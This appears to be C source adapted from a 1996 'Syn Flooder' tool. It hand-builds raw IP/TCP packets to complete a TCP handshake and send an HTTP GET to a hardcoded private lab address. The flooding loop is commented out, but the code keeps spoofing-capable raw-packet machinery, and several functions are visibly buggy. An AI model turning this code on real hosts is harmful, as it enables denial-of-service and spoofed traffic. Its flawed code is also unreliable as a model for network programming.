/* Syn Flooder by Zakath
 * TCP Functions by trurl_ (thanks man).
 * All other code by Zakath.
 * Not too cosemtic right now, just finished beta version. No docs on
 * how to use - figure it out yourself. Change the usleep() below depending
 * on your bandwidth / desired effect.
 *
 * [3.22.96]
 */

#include <arpa/inet.h>
#include <netdb.h>
#include <sys/types.h>
#include <sys/time.h>
#include <sys/socket.h>
#include <sys/ioctl.h>
#include <netinet/in.h>
#include <net/ethernet.h>
#include <linux/ip.h>
#include <linux/if.h>
#include <linux/if_packet.h>
#include <linux/tcp.h>
#include <linux/udp.h>
#include <unistd.h>

#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#define SEQ 0x28374839

unsigned long send_seq, ack_seq, srcport;
char flood = 0;
int rsock, ssock;
int *ack_num = 0;

/* Check Sum */
unsigned short
ip_sum (addr, len)
u_short *addr;
int len;
{
    register int nleft = len;
    register u_short *w = addr;
    register int sum = 0;
    u_short answer = 0;

    while (nleft > 1)
    {
        sum += *w++;
        nleft -= 2;
    }
    if (nleft == 1)
    {
        *(u_char *) (&answer) = *(u_char *) w;
        sum += answer;
    }
    sum = (sum >> 16) + (sum & 0xffff);   /* add hi 16 to low 16 */
    sum += (sum >> 16);           /* add carry */
    answer = ~sum;                /* truncate to 16 bits */
    return (answer);
}

unsigned long getaddr(char *name)
{
    struct hostent *hep;

    hep=gethostbyname(name);
    if(!hep)
    {
        fprintf(stderr, "Unknown host %s\n", name);
        exit(1);
    }
    return *(unsigned long *)hep->h_addr;
}


void send_tcp_segment(struct iphdr *ih, struct tcphdr *th, char *data, int dlen)
{
    char buf[65536];
    struct    /* rfc 793 tcp pseudo-header */
    {
        unsigned long saddr, daddr;
        char mbz;
        char ptcl;
        unsigned short tcpl;
    } ph;

    struct sockaddr_in sin;	/* how necessary is this, given that the destination
				   address is already in the ip header? */
	printf("sending... %s\n", data);

    ph.saddr=ih->saddr;
    ph.daddr=ih->daddr;
    ph.mbz=0;
    ph.ptcl=IPPROTO_TCP;
    ph.tcpl=htons(sizeof(*th)+dlen);

    memcpy(buf, &ph, sizeof(ph));
    memcpy(buf+sizeof(ph), th, sizeof(*th));
    memcpy(buf+sizeof(ph)+sizeof(*th), data, dlen);
    memset(buf+sizeof(ph)+sizeof(*th)+dlen, 0, 4);
    th->check=ip_sum(buf, (sizeof(ph)+sizeof(*th)+dlen+1)&~1);

    memcpy(buf, ih, 4*ih->ihl);
    memcpy(buf+4*ih->ihl, th, sizeof(*th));
    memcpy(buf+4*ih->ihl+sizeof(*th), data, dlen);
    memset(buf+4*ih->ihl+sizeof(*th)+dlen, 0, 4);

    ih->check=ip_sum(buf, (4*ih->ihl + sizeof(*th)+ dlen + 1) & ~1);
    memcpy(buf, ih, 4*ih->ihl);

    sin.sin_family=AF_INET;
    sin.sin_port=th->dest;
    sin.sin_addr.s_addr=ih->daddr;

    if(sendto(ssock, buf, 4*ih->ihl + sizeof(*th)+ dlen, 0,
              &sin, sizeof(sin))<0)
    {
        printf("Error sending syn packet.\n");
        perror("");
        exit(1);
    }
}

unsigned long spoof_open(unsigned long my_ip, unsigned long their_ip, unsigned short port)
{
    struct iphdr ih;
    struct tcphdr th;
    char buf[1024];
    struct timeval tv;

    ih.version=4;
    ih.ihl=5;
    ih.tos=0;			/* XXX is this normal? */
    ih.tot_len=sizeof(ih)+sizeof(th);
    ih.id=htons(random());
    ih.frag_off=0;
    ih.ttl=30;
    ih.protocol=IPPROTO_TCP;
    ih.check=0;
    ih.saddr=my_ip;
    ih.daddr=their_ip;

    th.source=htons(srcport);
    th.dest=htons(port);
    th.seq=htonl(SEQ);
    th.doff=sizeof(th)/4;
    th.ack_seq=0;
    th.res1=0;
    th.fin=0;
    th.syn=1;
    th.rst=0;
    th.psh=0;
    th.ack=0;
    th.urg=0;
//    th.res2=0;
    th.window=htons(65535);
    th.check=0;
    th.urg_ptr=0;

    send_tcp_segment(&ih, &th, "", 0);

    send_seq = SEQ+1+strlen(buf);
}

unsigned long spoof_ack(unsigned long my_ip, unsigned long their_ip, unsigned short port)
{
    struct iphdr ih;
    struct tcphdr th;
    char buf[1024];
    struct timeval tv;
	char *data = "";

    ih.version=4;
    ih.ihl=5;
    ih.tos=0;			/* XXX is this normal? */
    ih.tot_len=sizeof(ih)+sizeof(th);
    ih.id=htons(random());
    ih.frag_off=0;
    ih.ttl=30;
    ih.protocol=IPPROTO_TCP;
    ih.check=0;
    ih.saddr=my_ip;
    ih.daddr=their_ip;

    th.source=htons(srcport);
    th.dest=htons(port);
    th.seq=htonl(SEQ + 1);
    th.doff=sizeof(th)/4;
    th.ack_seq=(*ack_num);
    th.res1=0;
    th.fin=0;
    th.syn=0;
    th.rst=0;
    th.psh=0;
    th.ack=1;
    th.urg=0;
//    th.res2=0;
    th.window=htons(65535);
    th.check=0;
    th.urg_ptr=0;

    send_tcp_segment(&ih, &th, data, strlen(data));

    send_seq = SEQ+1+strlen(buf);
}

unsigned long spoof_data(unsigned long my_ip, unsigned long their_ip, unsigned short port)
{
    struct iphdr ih;
    struct tcphdr th;
    char buf[1024];
    struct timeval tv;
//    char *data = "GET / HTTP/1.1\r\nHost: 192.168.168.69\r\nUser-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:62.0) Gecko/20100101 Firefox/62.0\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Language: en-US,en;q=0.5\r\nAccept-Encoding: gzip, deflate\r\nConnection: keep-alive\r\nUpgrade-Insecure-Requests: 1\r\nIf-Modified-Since: Fri, 31 Aug 2018 09:06:39 GMT\r\nCache-Control: max-age=0\r\n";
//	char *opt_data = "\x01\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00GET / HTTP/1.1\r\nHost: 192.168.168.69\r\nUser-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:62.0) Gecko/20100101 Firefox/62.0\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Language: en-US,en;q=0.5\r\nAccept-Encoding: gzip, deflate\r\nConnection: keep-alive\r\nUpgrade-Insecure-Requests: 1\r\nIf-Modified-Since: Fri, 31 Aug 2018 09:06:39 GMT\r\nCache-Control: max-age=0\r\n";
	char *data = "GET / HTTP/1.1\r\n";
	char *opt_data = "\x01\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00GET / HTTP/1.1\r\n";
    ih.version=4;
    ih.ihl=5;
    ih.tos=0;           /* XXX is this normal? */
    ih.tot_len=sizeof(ih)+sizeof(th)+12;
    ih.id=htons(random());
    ih.frag_off=0;
    ih.ttl=30;
    ih.protocol=IPPROTO_TCP;
    ih.check=0;
    ih.saddr=my_ip;
    ih.daddr=their_ip;

    th.source=htons(srcport);
    th.dest=htons(port);
    th.seq=htonl(SEQ + 1);
    th.doff=(sizeof(th))/4;
    th.ack_seq=(*ack_num);
    th.res1=0;
    th.fin=0;
    th.syn=0;
    th.rst=0;
    th.psh=1;
    th.ack=1;
    th.urg=0;
	th.ece = 0;
	th.cwr = 0;
//    th.res2=0;
    th.window=htons(65535);
    th.check=0;
    th.urg_ptr=0;

//    send_tcp_segment(&ih, &th, opt_data, strlen(data)+12);
	send_tcp_segment(&ih, &th, data, strlen(data));

    send_seq = SEQ+1+strlen(buf);
}

int main(int argc, char **argv)
{
    int i;
    unsigned long des_ip, src_ip;
    unsigned long src_port, des_port;
    char buf[1024];
	char vbuf[0x800];
	ssize_t msg_len = 0;
	const char *opt = "ens33";
	char tmp[4];
	socklen_t socklen = 0;
    src_ip=getaddr("192.168.168.232");
    des_ip=getaddr("192.168.168.69");
    src_port=atoi("65530");
    des_port=atoi("80");
	setvbuf(stdin, vbuf, _IONBF, 0);
	setvbuf(stdout, vbuf, _IONBF, 0);
	setvbuf(stderr, vbuf, _IONBF, 0);
	srcport = src_port;


    ssock = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
    if(ssock<0)
    {
        perror("ssocket (raw)");
        exit(1);
    }

    rsock = socket(AF_INET, SOCK_RAW, IPPROTO_TCP);
    if(ssock<0)
    {
        perror("rsocket (raw)");
        exit(1);
    }
/*
	const int off = 0;
	if(setsockopt(ssock, IPPROTO_RAW, IP_HDRINCL, &off, sizeof(off) < 0))
	{
		perror("setsockopt error!\n");
	}
*/
	struct sockaddr_in sin_r;

	sin_r.sin_family = AF_INET;
	sin_r.sin_port = src_port;
	sin_r.sin_addr.s_addr = src_ip;
	socklen = (socklen_t) sizeof(sin_r);
	if(bind(rsock, (struct sockaddr *)&sin_r, (socklen_t)sizeof(sin_r))== -1)
	{
		perror("r: Error binding raw socket to interface\n");
		exit(-1);
	}
    struct sockaddr_in sin_s;

    sin_s.sin_family = AF_INET;
    sin_s.sin_port = src_port;
    sin_s.sin_addr.s_addr = src_ip;
    socklen = (socklen_t) sizeof(sin_s);
    if(bind(ssock, (struct sockaddr *)&sin_s, (socklen_t)sizeof(sin_s))== -1)
    {
        perror("s: Error binding raw socket to interface\n");
        exit(-1);
    }

	printf("start sending...\n");
//	ssock = rsock;
	spoof_open(src_ip, des_ip, des_port);
//	sleep(1);

	memset(buf, 0, sizeof(buf));
	printf("start recv...\n");

	if((msg_len = recv(rsock, buf, 0x3b - 0x0e, 0)) == -1)
	{
		perror("recv: ");
		exit(-1);
	}
	for (i = 0; i < 4; i ++)
	{
		tmp[i] = buf[0x1c - 0x4 + i];
	}
	tmp[3] ++;
	ack_num = (int *)tmp;
	printf("len = %ld\n", msg_len);
	for (i = 0; i < 128; i++)
	{
		if (i % 8 == 0)
		{
			printf(" ");
		}
		if (i % 0x10 == 0)
		{
			printf(" \n");
		}
		printf("%02x ", buf[i] & 0xff);
	}
	printf("%s\n", buf);
	spoof_ack(src_ip, des_ip, des_port);
/*
    if((msg_len = recv(rsock, buf, 0x3b - 0x0e, 0)) == -1)
    {
        perror("recv: ");
        exit(-1);
    }
    for (i = 0; i < 4; i ++)
    {
        tmp[i] = buf[0x1c - 0x4 + i];
    }
    tmp[3] ++;
    ack_num = (int *)tmp;
    printf("len = %ld\n", msg_len);
    for (i = 0; i < 128; i++)
    {
        if (i % 8 == 0)
        {
            printf(" ");
        }
        if (i % 0x10 == 0)
        {
            printf(" \n");
        }
        printf("%02x ", buf[i] & 0xff);
    }
    printf("%s\n", buf);
*/

	 spoof_data(src_ip, des_ip, des_port);

/*
	printf("flooding. each dot equals 25 packets.\n");

    srcport = src_port;
    spoof_open(src_ip, des_ip, des_port);
    sleep(1);
    printf(".");

    printf("\nFlood completed.\n");
*/
    return 0;
}
